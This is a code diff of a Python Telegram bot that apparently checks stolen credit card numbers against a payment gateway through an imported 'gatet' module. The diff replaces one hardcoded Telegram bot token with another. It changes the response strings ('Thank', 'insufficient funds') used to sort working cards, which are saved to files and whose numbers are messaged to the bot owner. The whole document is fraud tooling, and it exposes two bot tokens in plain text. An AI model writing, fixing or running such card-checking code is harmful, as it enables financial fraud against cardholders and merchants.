@@ -3,7 +3,7 @@ import telebot,time
 from telebot import types
 from gatet import Tele
 import os
-token = '7040296782:AAFXynxC35O099GeYNeXjUTrJsJ0a4QB_Qs'
+token = '8181812070:AAE730BqIxuKpmikhYLKBawtSYZay5UaUts'
 bot=telebot.TeleBot(token,parse_mode="HTML")
 @bot.message_handler(commands=["start"])
 def start(message):
@@ -95,12 +95,12 @@ by ➜ @strawhatchannel96 ''', reply_markup=mes)
 				
 				card_info = f"💳 Card: {cc.strip()} \n📝 Message: Response: {last}"
 
-				if "Complete" in last:
+				if "Thank" in last:
 				    with open("thank_cards.txt", "a") as thank_file:
 				        thank_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"✅ Thank Result Found:\n💳 Card: {cc.strip()}")
 
-				elif "Not sufficient funds" in last:
+				elif "insufficient funds" in last:
 				    with open("insufficient_cards.txt", "a") as insufficient_file:
  				       insufficient_file.write(card_info + "\n")
 				    bot.send_message(owner_id, f"⚠️ Insufficient Funds Card:\n💳 Card: {cc.strip()}")
